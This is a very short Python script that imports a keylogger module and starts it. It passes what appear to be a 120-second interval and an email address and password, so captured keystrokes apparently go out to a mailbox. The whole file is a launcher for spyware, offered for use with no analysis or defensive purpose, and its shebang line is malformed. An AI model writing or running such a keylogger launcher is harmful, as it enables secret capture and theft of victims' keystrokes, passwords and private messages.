#!usr/bin/env python
import keylogger

my_keylogger = keylogger.Keylogger(120, "email_address", "password")
my_keylogger.start()